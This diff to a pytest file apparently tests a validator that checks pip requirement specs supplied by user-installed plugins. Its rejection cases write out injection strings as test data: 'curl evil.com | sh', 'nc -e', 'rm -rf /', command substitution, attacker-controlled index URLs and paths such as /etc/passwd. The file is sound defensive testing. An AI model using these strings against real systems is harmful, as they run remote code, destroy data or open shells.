@@ -40,47 +40,86 @@ def _register_fake_feature(monkeypatch, feature: str, specs: tuple[str, ...]) ->
 
 
 class TestSpecSafety:
+    """_spec_is_safe guards install_specs, whose specs come from a plugin.
+
+    ``pip_dependencies`` in a plugin manifest is not ours: a user can install
+    a plugin from ~/.hermes/plugins. ensure() needs no such check, because
+    its specs come from the extras in pyproject.toml.
+
+    Each spec becomes one argv entry and no caller uses shell=True, so the
+    shapes that matter are the ones pip itself acts on: an index URL, a
+    remote repository, or a local path.
+
+    The package names below are invented. A real name would tie this test to
+    a pin that moves.
+    """
+
     @pytest.mark.parametrize("spec", [
-        "mistralai>=2.3.0,<3",
-        "elevenlabs>=1.0,<2",
-        "honcho-ai>=2.2.0,<3",
-        "boto3>=1.35.0,<2",
-        "mautrix[encryption]>=0.20,<1",
-        "google-api-python-client>=2.100,<3",
-        "youtube-transcript-api>=1.2.0",
-        "qrcode>=7.0,<8",
-        "package",  # bare name, no version
-        "package==1.0.0",
-        "package~=1.0",
+        "zzzpkg",                        # bare name
+        "zzzpkg==1.0.0",
+        "zzzpkg>=1.0,<2",
+        "zzzpkg~=1.0",
+        "zzz-pkg>=2.3.0,<3",             # hyphen
+        "zzz_pkg==1.0",                  # underscore
+        "zzzpkg[extra]>=0.20,<1",        # extras block
+        "zzzpkg>=1.2.0",                 # floor only
     ])
-    def test_safe_specs_pass(self, spec):
+    def test_a_plain_requirement_is_accepted(self, spec):
         assert ld._spec_is_safe(spec), f"expected {spec!r} to be safe"
 
     @pytest.mark.parametrize("spec", [
-        # URL-shaped → rejected (no remote origin override allowed)
+        # pip reads an index that the attacker controls.
+        "--index-url=http://evil/",
+        "--extra-index-url=http://evil/",
+        "-i http://evil/",
+        # pip reads a file the attacker names.
+        "-r requirements.txt",
+        # pip fetches a repository and runs its setup.py.
         "git+https://github.com/foo/bar.git",
         "https://example.com/foo.tar.gz",
-        # File path → rejected
+        "zzzpkg @ https://example.com/foo.whl",
+        # pip installs a local tree.
         "/etc/passwd",
         "./local-malware",
         "../escape",
-        # Shell metacharacters → rejected
-        "package; rm -rf /",
-        "package && curl evil.com | sh",
-        "package`whoami`",
-        "package$(whoami)",
-        "package|nc -e",
-        # Pip flag injection → rejected
-        "--index-url=http://evil/",
-        "-r requirements.txt",
-        # Whitespace control chars → rejected
-        "package\nshell-injection",
-        "package\rmore",
-        # Empty / overly long → rejected
+        # Not a requirement at all. Rejected by the shape rule, so a future
+        # caller that does build a command line gets nothing to work with.
+        "zzzpkg; rm -rf /",
+        "zzzpkg && curl evil.com | sh",
+        "zzzpkg`whoami`",
+        "zzzpkg$(whoami)",
+        "zzzpkg|nc -e",
+        "zzzpkg\nsecond-line",
+        "zzzpkg\rmore",
+        # Empty, or long enough to be something other than a requirement.
         "",
+        "   ",
         "x" * 500,
     ])
-    def test_unsafe_specs_rejected(self, spec):
+    def test_anything_that_is_not_a_plain_requirement_is_rejected(self, spec):
+        assert not ld._spec_is_safe(spec), \
+            f"expected {spec!r} to be rejected"
+
+    @pytest.mark.parametrize("spec", [
+        "zzzpkg==1.0 --force",   # a flag after a valid requirement
+        "==1.0",                 # version with no name
+        "zzz pkg==1.0",          # space inside the name
+        "zzzpkg{1.0}",
+        "zzzpkg!",
+        "zzzpkg%20==1.0",
+    ])
+    def test_the_shape_rule_rejects_what_the_other_clauses_pass(self, spec):
+        """The pattern match, on its own.
+
+        Each spec here holds no metacharacter, no path and no URL, so each
+        earlier clause of _spec_is_safe accepts it. Only the pattern rejects
+        it. Without these cases the pattern could return True for every
+        input and each other test in this class would still pass.
+
+        The first case is the one that matters: a second argument after a
+        valid requirement puts a flag of the attacker's choice on the pip
+        command line.
+        """
         assert not ld._spec_is_safe(spec), \
             f"expected {spec!r} to be rejected"
 
